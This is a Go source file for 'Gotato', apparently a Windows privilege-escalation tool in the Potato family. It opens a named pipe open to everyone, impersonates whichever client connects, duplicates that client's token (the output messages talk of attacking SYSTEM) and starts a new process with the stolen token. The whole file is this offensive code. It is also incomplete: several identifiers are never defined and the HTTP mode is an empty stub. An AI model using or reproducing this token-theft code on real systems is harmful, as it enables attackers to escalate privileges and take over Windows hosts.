package main

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	MODE_NAMED_PIPE = 0
	MODE_HTTP       = 1
)

var (
	advapi32DLL                  = syscall.NewLazyDLL("advapi32.dll")
	impersonateNamedPipeClient   = advapi32DLL.NewProc("ImpersonateNamedPipeClient")
	createProcessWithTokenW      = advapi32DLL.NewProc("CreateProcessWithTokenW")
	setSecurityDescriptorDacl    = advapi32DLL.NewProc("SetSecurityDescriptorDacl")
	initializeSecurityDescriptor = advapi32DLL.NewProc("InitializeSecurityDescriptor")
)

type IGotatoAPI interface {
	Trigger() bool
	Start()
	NamedPipeListener()
	HttpListener()
}

type GotatoAPI struct {
	Port            uint
	Host            string
	Mode            uint
	DuplicatedToken windows.Token
}

func (api GotatoAPI) ExecuteWithToken() error {
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	_, _, err := createProcessWithTokenW.Call(uintptr(api.DuplicatedToken), 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(program))), uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(args))),
		CREATE_NEW_CONSOLE, 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))

	if err != syscall.Errno(0) {
		fmt.Println("[!] Failed to create process with stolen token")
		err := windows.CreateProcessAsUser(api.DuplicatedToken, windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, false, CREATE_NEW_CONSOLE, nil, nil, &si, &pi)
		fmt.Println(err)

		return err
	}

	fmt.Println("[*] Process spawned with stolen token!")

	return nil
}

func (api GotatoAPI) NamedPipeListener() error {
	var sd windows.SECURITY_DESCRIPTOR
	pipeName := "\\\\.\\pipe\\test"

	_, _, err := initializeSecurityDescriptor.Call(uintptr(unsafe.Pointer(&sd)), 1)
	if err == syscall.Errno(0) {
		_, _, err = setSecurityDescriptorDacl.Call(uintptr(unsafe.Pointer(&sd)), 1, 0, 0)
		if err != syscall.Errno(0) {
			fmt.Println("[!] Couldn't allow everyone to read pipe - if you are attacking SYSTEM this is fine")
		} else {
			fmt.Println("[+] Set DACL to allow anyone to access")
		}
	}

	sa := windows.SecurityAttributes{
		Length:             40,
		SecurityDescriptor: &sd,
		InheritHandle:      0,
	}
	pipeHandle, err := windows.CreateNamedPipe(windows.StringToUTF16Ptr(pipeName), windows.PIPE_ACCESS_DUPLEX, windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT|windows.PIPE_REJECT_REMOTE_CLIENTS, 10, 2048, 2048, 0, &sa)

	if err != nil {
		fmt.Println("[!] Failed to create pipe "+pipeName+": ", windows.GetLastError())
		return err
	}

	fmt.Println("[+] Created pipe, listening for connections")
	err = windows.ConnectNamedPipe(pipeHandle, nil)

	if err != nil {
		fmt.Println("[!] Failed to connect to pipe "+pipeName+": ", windows.GetLastError())
		windows.CloseHandle(pipeHandle)
		return err
	}

	fmt.Println("[+] Connection established, duplicating client token")

	buf := []byte{0}
	_, err = windows.Read(pipeHandle, buf)

	if err != nil {
		fmt.Println("[!] Failed to read from pipe")
		return err
	}

	_, _, err = impersonateNamedPipeClient.Call(uintptr(pipeHandle))

	if err != syscall.Errno(0) {
		fmt.Println("[!] Call to ImpersonateNamedPipeClient failed")
		return err
	}

	threadHandle, err := windows.GetCurrentThread()

	if err != nil {
		fmt.Println("[!] Failed to get current thread")
		return err
	}

	var threadToken windows.Token
	err = windows.OpenThreadToken(threadHandle, windows.TOKEN_ALL_ACCESS, false, &threadToken)

	if err != nil {
		fmt.Println("[!] Failed to open thread token")
		return err
	}

	var systemToken windows.Token
	err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil, SecurityImpersonation, windows.TokenPrimary, &systemToken)

	if err != nil {
		fmt.Println("[!] Failed to duplicate client token")
		return err
	}

	hostName, _ := os.Hostname()
	principal, _ := systemToken.GetTokenUser()
	sid := principal.User.Sid
	account, domain, _, _ := sid.LookupAccount(hostName)
	fmt.Println("[+] Stole token from " + domain + "\\" + account + " (" + sid.String() + ")")

	windows.RevertToSelf()
	windows.CloseHandle(pipeHandle)

	api.DuplicatedToken = systemToken
	err = api.ExecuteWithToken()

	if err != nil {
		fmt.Println("[!] Failed to execute with stolen token")
		return err
	}

	return nil
}

func (api GotatoAPI) HttpListener() {

}

func (api GotatoAPI) Listen() {
	switch api.Mode {
	case MODE_NAMED_PIPE:
		err := api.NamedPipeListener()
		if err != nil {
			fmt.Println(err)
		}
	case MODE_HTTP:
		api.HttpListener()
	}
}

func (api GotatoAPI) Trigger() bool {
	return true
}
